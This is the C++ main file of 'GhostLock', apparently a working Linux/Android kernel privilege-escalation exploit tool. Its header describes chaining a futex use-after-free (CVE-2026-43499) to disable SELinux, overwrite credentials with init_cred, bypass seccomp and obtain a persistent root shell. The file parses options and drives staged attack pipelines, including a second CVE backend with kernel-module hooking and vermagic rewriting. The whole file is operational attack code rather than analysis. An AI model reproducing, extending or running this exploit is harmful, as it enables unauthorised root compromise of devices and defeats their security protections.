/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 *
 * This translation unit is the thin adapter: parse, run the stage sequence and
 * map the outcome to the process exit code. Setup, attack primitives, victim
 * protocol and stage policy live in their own units under ghostlock::attack,
 * ghostlock::backend::victim, ghostlock::race and ghostlock::session::stages.
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "kernelsnitch/utils.h"

#include <cstdint>

#include "profile/entry.h"
#include "backend/cve_2026_43284/diagnostic.hpp"
#include "backend/cve_2026_43284/session_frame.hpp"
#include "backend/cve_2026_43284/stage_runner.hpp"
#include "support/cli.hpp"
#include "support/fatal_error.hpp"
#include "support/run_state.hpp"
#include "pipeline/orchestrator.hpp"

#include <array>
#include <memory>
#include <string>
#include <string_view>

#include <unistd.h>

using namespace ghostlock;


int main(int argc, char **argv) {
    try {
        support::cli::Options options{};
        support::cli::ParseError parse_error;
        if (!support::cli::parse_arguments(argc, argv, options, parse_error)) {
            switch (parse_error) {
                case support::cli::ParseError::MultipleEntrypoints:
                    pr_error("choose one entrypoint\n");
                    break;
                case support::cli::ParseError::StatusRequiresAppCall:
                    pr_error("--enable-status-record requires --ghostlock-app-call\n");
                    break;
                case support::cli::ParseError::ProbeConflict:
                    pr_error("--probe-cve-2026-43284 cannot be combined with other flags\n");
                    break;
                case support::cli::ParseError::RunConflict:
                    pr_error("--run-cve-2026-43284 cannot be combined with"
                             " --force-attack/--dump-kernel-log/--enable-status-record\n");
                    break;
                case support::cli::ParseError::BadStage:
                    pr_error("--stage must be one of plan|write|trigger|full\n");
                    break;
                case support::cli::ParseError::StageRequiresRun:
                    pr_error("--stage requires --run-cve-2026-43284\n");
                    break;
                case support::cli::ParseError::DevTargetRequiresRun:
                    pr_error("--allow-dev-target requires --run-cve-2026-43284\n");
                    break;
                case support::cli::ParseError::Cve43284OptionRequiresRun:
                    pr_error("--cve43284-* options require --run-cve-2026-43284\n");
                    break;
                case support::cli::ParseError::BadHookGuard:
                    pr_error("--cve43284-hook-guard must be reject|skip\n");
                    break;
                default:
                    pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin> |"
                             " --probe-cve-2026-43284 <ko-path> |"
                             " --run-cve-2026-43284 <ko-path> <target-file>"
                             " [--stage=plan|write|trigger|full]"
                             " [--allow-dev-target]"
                             " [--cve43284-hook-target <path>]"
                             " [--cve43284-hook-symbol <mangled>]"
                             " [--cve43284-hook-guard reject|skip]"
                             " [--cve43284-carrier <path>]"
                             " [--cve43284-patch1-target <path>]"
                             " [--cve43284-allow-vermagic-rewrite]]"
                             " [--dump-kernel-log <dir>] [--force-attack]"
                             " [--enable-status-record]\n",
                             argv[0]);
                    break;
            }
            return 1;
        }
        if (options.mode == support::cli::Mode::ProbeCve2026_43284) {
            return backend::cve_2026_43284::diagnostic::run_diagnostic_cli(
                    options.probe_module_path);
        }
        if (options.mode == support::cli::Mode::RunCve2026_43284) {
            /* Explicit staged execution: never reachable from a profile/wire
             * selection, so backend_available(Cve2026_43284) stays false and
             * the default pipeline never runs it. */
            using backend::cve_2026_43284::stage_runner::StagedRunOptions;
            const auto stage = static_cast<
                    backend::cve_2026_43284::stage_runner::Stage>(
                    static_cast<std::uint8_t>(options.run_stage));
            StagedRunOptions staged{};
            staged.module_path = options.run_module_path;
            staged.target_path = options.run_target_path;
            staged.stage = stage;
            staged.allow_dev_target = options.allow_dev_target;
            staged.allow_vermagic_rewrite = options.allow_vermagic_rewrite;
            if (options.run_hook_target != nullptr) {
                staged.hook_target = options.run_hook_target;
            }
            if (options.run_hook_symbol != nullptr) {
                staged.hook_symbol = options.run_hook_symbol;
            }
            if (options.run_carrier_path != nullptr) {
                staged.carrier_path = options.run_carrier_path;
            }
            if (options.run_patch1_target != nullptr) {
                staged.patch1_target = options.run_patch1_target;
            }
            if (options.run_hook_guard ==
                support::cli::Cve43284HookGuard::Reject) {
                staged.hook_guard =
                        backend::cve_2026_43284::steps::HookGuardPolicy::Reject;
            }
            return backend::cve_2026_43284::stage_runner::run_stage_cli(staged);
        }
        const bool app_call = options.mode == support::cli::Mode::AppCall;
        const bool force_attack = options.force_attack;
        const bool status_record = options.status_record;
        const char *prebuilt_path = options.load_prebuilt_profile;
        const char *dump_dir = options.dump_kernel_log;
        support::run_state::configure(status_record);

        profile_entry::ReadResult read;
        if (prebuilt_path != nullptr) {
            read = profile_entry::read_glk1_file(prebuilt_path);
        } else if (app_call) {
            read = status_record ? profile_entry::read_glk1_frame_stdin()
                                 : profile_entry::read_glk1_stdin();
        } else {
            pr_error("no entrypoint: pass --ghostlock-app-call or --load-prebuilt-profile <bin>\n");
            return 1;
        }
        if (read.error != 0) {
            pr_error("cannot load profile\n");
            throw FatalError{};
        }
        /* The wire selection: v2 carries numeric ids, GLKv3 carries component
         * tokens. Resolving the tokens is composition-root work because the
         * component vocabulary lives in the catalogue, not in the transport. */
        profile::Document &decoded = read.document;
        if (!decoded.backend_token.empty()) {
            contract::BackendKind backend_kind{};
            if (!pipeline::backend_from_token(decoded.backend_token, backend_kind)) {
                pr_error("cannot load profile\n");
                throw FatalError{};
            }
            decoded.backend = static_cast<uint16_t>(backend_kind);
        }
        if (!decoded.terminal_token.empty()) {
            contract::TerminalKind terminal_kind{};
            if (!pipeline::terminal_from_token(decoded.terminal_token, terminal_kind)) {
                pr_error("cannot load profile\n");
                throw FatalError{};
            }
            decoded.terminal = static_cast<uint16_t>(terminal_kind);
        }

        auto &session = session::g_exploit_session;
        /* Route is backend-internal (ADR-0004 R12): the backend reads it from
         * the bound profile; the selection carries only backend/steps/terminal. */
        const contract::ComponentSelection selection{
            .backend = static_cast<contract::BackendKind>(decoded.backend),
            .steps = pipeline::wire_stepset(decoded),
            .terminal = static_cast<contract::TerminalKind>(decoded.terminal),
        };
        /* B5-1 (channel B): only the cve_2026_43284 backend MAY be followed by
         * the optional runtime session-secret frame on the same stdin, after
         * the length-prefixed GLKv3 document. Every other backend -- 43499
         * included -- never reads it, so their stdin/status-ACK behavior is
         * unchanged. On the 43284 path an absent or malformed frame is
         * fail-closed. The secrets stay process-local and are zeroized at scope
         * exit; they never reach a profile, a file, argv or a log. */
        backend::cve_2026_43284::ScopedIpsecSaParams session_secrets;
        if (app_call && status_record &&
            selection.backend == contract::BackendKind::Cve2026_43284) {
            const backend::cve_2026_43284::SessionFrameStatus frame_status =
                    backend::cve_2026_43284::read_session_secret_frame(
                            STDIN_FILENO, &session_secrets.value);
            if (frame_status !=
                backend::cve_2026_43284::SessionFrameStatus::Ok) {
                pr_error("session secret frame rejected\n");
                throw FatalError{};
            }
        }
        if (!contract::selection_supported(selection)) {
            /* Known-but-unavailable ids land here (unknown ids were rejected at
             * decode time), named for diagnosis. */
            const std::string terminal(pipeline::terminal_name(selection.terminal));
            const std::string backend(pipeline::backend_name(selection.backend));
            const std::string steps(pipeline::stepset_name(selection.steps));
            const std::string route(pipeline::middleware_name(
                static_cast<pipeline::MiddlewareKind>(decoded.middleware)));
            pr_error("unsupported component selection: backend=%s steps=%s terminal=%s route=%s\n",
                     backend.c_str(), steps.c_str(), terminal.c_str(), route.c_str());
            throw FatalError{};
        }
        /* Batch 4 (D1=B): the orchestrator dispatches the catalogued pipeline
         * directly (backend steps + terminal handoff). DiagnosticStop is a
         * successful early stop (objective already met), not a full run. */
        const pipeline::RunResult result = pipeline::run_orchestrated_pipeline(
            session, selection, decoded, dump_dir, force_attack);
        switch (result.code) {
            case pipeline::RunCode::Rejected:
                pr_error("orchestrator rejected the component selection\n");
                throw FatalError{};
            case pipeline::RunCode::Failed:
                return 1;
            case pipeline::RunCode::Completed:
            case pipeline::RunCode::DiagnosticStop:
                return 0;
        }
        throw FatalError{};
    } catch (const FatalError &) {
        return 1;
    }
}
